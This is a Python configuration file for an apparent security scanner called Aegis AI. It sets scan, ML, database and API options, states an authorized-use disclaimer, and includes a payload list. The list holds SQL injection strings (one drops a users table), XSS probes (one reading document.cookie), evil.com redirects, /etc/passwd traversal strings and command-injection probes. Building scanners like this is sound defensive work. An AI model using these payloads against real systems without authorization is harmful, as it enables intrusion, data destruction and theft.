"""
Aegis AI — Global Configuration
Centralized configuration for the entire Aegis system.
"""
import os
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict

BASE_DIR = Path(__file__).parent.parent


@dataclass
class ScanConfig:
    """Scanner behavior configuration."""
    max_depth: int = 3
    max_endpoints: int = 200
    request_timeout: int = 10
    delay_between_requests: float = 0.5
    max_concurrent_requests: int = 5
    follow_redirects: bool = True
    user_agent: str = (
        "AegisAI/1.0 (Authorized Security Scanner; "
        "https://github.com/aegis-ai; contact@aegis-ai.sec)"
    )


@dataclass
class MLConfig:
    """Machine learning model configuration."""
    model_dir: Path = BASE_DIR / "ml_models" / "trained"
    classifier_model: str = "vuln_classifier.joblib"
    anomaly_model: str = "anomaly_detector.joblib"
    min_training_samples: int = 50
    anomaly_contamination: float = 0.1


@dataclass
class DatabaseConfig:
    """Database configuration."""
    url: str = f"sqlite+aiosqlite:///{BASE_DIR}/database/aegis.db"
    echo: bool = False


@dataclass
class APIConfig:
    """API server configuration."""
    host: str = "0.0.0.0"
    port: int = 8000
    reload: bool = False
    cors_origins: List[str] = field(
        default_factory=lambda: ["http://localhost:3000", "http://localhost:5173"]
    )


@dataclass
class AegisConfig:
    """Root configuration object."""
    scan: ScanConfig = field(default_factory=ScanConfig)
    ml: MLConfig = field(default_factory=MLConfig)
    database: DatabaseConfig = field(default_factory=DatabaseConfig)
    api: APIConfig = field(default_factory=APIConfig)
    debug: bool = os.getenv("AEGIS_DEBUG", "false").lower() == "true"
    version: str = "1.0.0"

    # Ethical disclaimer
    authorized_only: bool = True
    disclaimer: str = (
        "⚠️  AEGIS AI is for EDUCATIONAL and AUTHORIZED PENETRATION TESTING ONLY. "
        "Only scan systems you own or have explicit written permission to test. "
        "Unauthorized scanning is illegal and unethical."
    )


# Singleton config instance
config = AegisConfig()

# Payload definitions for exploit testing
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL--",
        "1'; DROP TABLE users--",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "1 OR 1=1",
        "' OR ''='",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        '"><script>alert(document.cookie)</script>',
        "<body onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
    ],
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "https://evil.com%2f@legitimate.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "command_injection": [
        "; ls -la",
        "| id",
        "&& whoami",
        "`id`",
        "$(id)",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
    ],
}

# Endpoint classification patterns
ENDPOINT_PATTERNS = {
    "authentication": [
        r"/login", r"/signin", r"/auth", r"/oauth", r"/token",
        r"/session", r"/register", r"/signup", r"/logout",
    ],
    "file_upload": [
        r"/upload", r"/file", r"/media", r"/asset", r"/image",
        r"/document", r"/attachment", r"/import",
    ],
    "admin_panel": [
        r"/admin", r"/dashboard", r"/manage", r"/control",
        r"/panel", r"/backend", r"/staff", r"/operator",
    ],
    "api_endpoint": [
        r"/api", r"/v\d+", r"/rest", r"/graphql", r"/rpc",
        r"/service", r"/endpoint", r"/webhook",
    ],
    "user_data": [
        r"/user", r"/account", r"/profile", r"/me",
        r"/member", r"/customer", r"/client",
    ],
    "data_retrieval": [
        r"/search", r"/query", r"/filter", r"/list",
        r"/data", r"/report", r"/export",
    ],
}

# Security headers to check
SECURITY_HEADERS = {
    "Content-Security-Policy": {
        "description": "Prevents XSS and injection attacks",
        "severity": "HIGH",
    },
    "X-Frame-Options": {
        "description": "Prevents clickjacking attacks",
        "severity": "MEDIUM",
    },
    "Strict-Transport-Security": {
        "description": "Enforces HTTPS connections",
        "severity": "HIGH",
    },
    "X-Content-Type-Options": {
        "description": "Prevents MIME-sniffing attacks",
        "severity": "MEDIUM",
    },
    "X-XSS-Protection": {
        "description": "Legacy XSS filter (browser-level)",
        "severity": "LOW",
    },
    "Referrer-Policy": {
        "description": "Controls referrer information leakage",
        "severity": "LOW",
    },
    "Permissions-Policy": {
        "description": "Controls browser feature access",
        "severity": "LOW",
    },
}
